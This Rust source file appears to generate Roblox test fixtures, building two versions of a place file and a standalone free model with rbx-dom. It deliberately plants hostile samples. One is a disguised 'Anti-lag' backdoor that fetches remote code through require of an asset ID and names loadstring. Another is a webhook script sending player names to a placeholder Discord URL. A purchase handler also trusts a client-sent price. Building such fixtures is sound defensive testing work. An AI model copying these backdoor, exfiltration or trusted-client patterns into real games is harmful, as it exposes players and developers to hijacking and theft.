//! Generates authentic Roblox test files with rbx-dom (the library Rojo and Lune use).
//! Usage: fixgen <out_dir>
use std::{env, fs::File, io::BufWriter, path::Path};

use rbx_dom_weak::{InstanceBuilder, WeakDom};
use rbx_types::{Attributes, CFrame, Color3, Enum, Matrix3, Tags, Variant, Vector3};

const MAIN_V1: &str = r#"local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Util = require(ReplicatedStorage.Util)
local BuyItem = ReplicatedStorage.Remotes.BuyItem

BuyItem.OnServerEvent:Connect(function(player, itemName, price)
	-- trusts the client's price
	player.leaderstats.Coins.Value -= price
	Util.give(player, itemName)
end)

while true do
	wait(1)
end
"#;

const MAIN_V2: &str = r#"local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Util = require(ReplicatedStorage.Util)
local Prices = require(ReplicatedStorage.Prices)
local BuyItem = ReplicatedStorage.Remotes.BuyItem

BuyItem.OnServerEvent:Connect(function(player, itemName)
	local price = Prices[itemName]
	if not price then return end
	player.leaderstats.Coins.Value -= price
	Util.give(player, itemName)
end)
"#;

const UTIL_V1: &str = r#"local Util = {}

function Util.give(player, itemName)
	print("giving", itemName, "to", player.Name)
end

return Util
"#;

const UTIL_V2: &str = r#"local Util = {}

function Util.give(player, itemName)
	local inv = player:FindFirstChild("Inventory")
	if inv then
		local v = Instance.new("BoolValue")
		v.Name = itemName
		v.Parent = inv
	end
end

return Util
"#;

const CLIENT: &str = r#"local ReplicatedStorage = game:GetService("ReplicatedStorage")
local BuyItem = ReplicatedStorage.Remotes.BuyItem

script.Parent.ShopButton.Activated:Connect(function()
	BuyItem:FireServer("Sword", 100)
end)
"#;

const BACKDOOR: &str = r#"-- Anti-lag script, do not remove
local a = getfenv()
require(4815162342)
local s = "loadstring"
"#;

const ANALYTICS: &str = r#"local HttpService = game:GetService("HttpService")
local URL = "https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz"
game.Players.PlayerAdded:Connect(function(p)
	pcall(HttpService.PostAsync, HttpService, URL, p.Name .. " joined")
end)
"#;

const PRICES: &str = "return { Sword = 100, Shield = 75 }\n";

fn cframe(x: f32, y: f32, z: f32) -> CFrame {
    CFrame::new(Vector3::new(x, y, z), Matrix3::identity())
}

fn build(v2: bool) -> WeakDom {
    let mut dom = WeakDom::new(InstanceBuilder::new("DataModel"));
    let root = dom.root_ref();

    // Workspace
    let ws = dom.insert(root, InstanceBuilder::new("Workspace").with_name("Workspace"));
    let mut lava_attrs = Attributes::new()
        .with("Damage", Variant::Float64(if v2 { 50.0 } else { 25.0 }))
        .with("Label", Variant::String("Hot".into()))
        .with("Enabled", Variant::Bool(true));
    if v2 {
        lava_attrs = lava_attrs.with("Color", Variant::Color3(Color3::new(1.0, 0.25, 0.0)));
    }
    let lava = dom.insert(
        ws,
        InstanceBuilder::new("Part")
            .with_name("Lava")
            .with_property("Anchored", true)
            .with_property("Size", Vector3::new(if v2 { 20.0 } else { 10.0 }, 1.0, 10.0))
            .with_property("CFrame", cframe(0.0, 0.5, 0.0))
            .with_property("Color", Color3::new(1.0, 0.33, 0.0))
            .with_property("Attributes", lava_attrs)
            .with_property("Tags", Tags::from(vec!["Lava".to_string(), "Hazard".to_string()])),
    );
    let _ = lava;
    dom.insert(
        ws,
        InstanceBuilder::new("Script")
            .with_name("ClientRunner")
            .with_property("RunContext", Enum::from_u32(2)) // Client
            .with_property("Source", "print('I run on the client via RunContext')\n"),
    );
    let blocks = dom.insert(ws, InstanceBuilder::new("Folder").with_name("Blocks"));
    for i in 0..40 {
        dom.insert(
            blocks,
            InstanceBuilder::new("Part")
                .with_name("Block")
                .with_property("Anchored", true)
                .with_property("CFrame", cframe(i as f32 * 4.0, 2.0, 0.0)),
        );
    }
    // A free model someone dropped in, with a nested backdoor
    let tree = dom.insert(ws, InstanceBuilder::new("Model").with_name("FreeTree"));
    let trunk = dom.insert(tree, InstanceBuilder::new("Part").with_name("Trunk"));
    if !v2 {
        dom.insert(
            trunk,
            InstanceBuilder::new("Script").with_name("Fire").with_property("Source", BACKDOOR),
        );
    }

    // ReplicatedStorage
    let rs = dom.insert(root, InstanceBuilder::new("ReplicatedStorage").with_name("ReplicatedStorage"));
    dom.insert(
        rs,
        InstanceBuilder::new("ModuleScript")
            .with_name("Util")
            .with_property("Source", if v2 { UTIL_V2 } else { UTIL_V1 }),
    );
    if v2 {
        dom.insert(
            rs,
            InstanceBuilder::new("ModuleScript").with_name("Prices").with_property("Source", PRICES),
        );
    }
    let remotes = dom.insert(rs, InstanceBuilder::new("Folder").with_name("Remotes"));
    dom.insert(remotes, InstanceBuilder::new("RemoteEvent").with_name("BuyItem"));
    dom.insert(remotes, InstanceBuilder::new("RemoteFunction").with_name("GetStats"));
    dom.insert(
        rs,
        InstanceBuilder::new("StringValue")
            .with_name("BigData")
            .with_property("Value", "x".repeat(20_000)),
    );

    // ServerScriptService
    let sss = dom.insert(
        root,
        InstanceBuilder::new("ServerScriptService").with_name("ServerScriptService"),
    );
    dom.insert(
        sss,
        InstanceBuilder::new("Script")
            .with_name("Main")
            .with_property("Source", if v2 { MAIN_V2 } else { MAIN_V1 }),
    );
    dom.insert(
        sss,
        InstanceBuilder::new("Script")
            .with_name("Analytics")
            .with_property("Disabled", v2)
            .with_property("Source", ANALYTICS),
    );

    // StarterPlayer
    let sp = dom.insert(root, InstanceBuilder::new("StarterPlayer").with_name("StarterPlayer"));
    let sps = dom.insert(
        sp,
        InstanceBuilder::new("StarterPlayerScripts").with_name("StarterPlayerScripts"),
    );
    dom.insert(
        sps,
        InstanceBuilder::new("LocalScript").with_name("Shop").with_property("Source", CLIENT),
    );

    dom
}

fn write_place(dom: &WeakDom, dir: &Path, stem: &str) {
    let refs = dom.root().children().to_vec();
    rbx_binary::to_writer(
        BufWriter::new(File::create(dir.join(format!("{stem}.rbxl"))).unwrap()),
        dom,
        &refs,
    )
    .unwrap();
    rbx_xml::to_writer_default(
        BufWriter::new(File::create(dir.join(format!("{stem}.rbxlx"))).unwrap()),
        dom,
        &refs,
    )
    .unwrap();
}

fn main() {
    let out = env::args().nth(1).expect("usage: fixgen <out_dir>");
    let dir = Path::new(&out);
    std::fs::create_dir_all(dir).unwrap();

    write_place(&build(false), dir, "place_v1");
    write_place(&build(true), dir, "place_v2");

    // A standalone "free model" (.rbxm) with a backdoor
    let mut dom = WeakDom::new(InstanceBuilder::new("DataModel"));
    let root = dom.root_ref();
    let model = dom.insert(root, InstanceBuilder::new("Model").with_name("CoolCar"));
    dom.insert(model, InstanceBuilder::new("Part").with_name("Body"));
    dom.insert(
        model,
        InstanceBuilder::new("Script").with_name("Fire").with_property("Source", BACKDOOR),
    );
    rbx_binary::to_writer(
        BufWriter::new(File::create(dir.join("free_model.rbxm")).unwrap()),
        &dom,
        &[model],
    )
    .unwrap();
    println!("fixtures written to {}", dir.display());
}
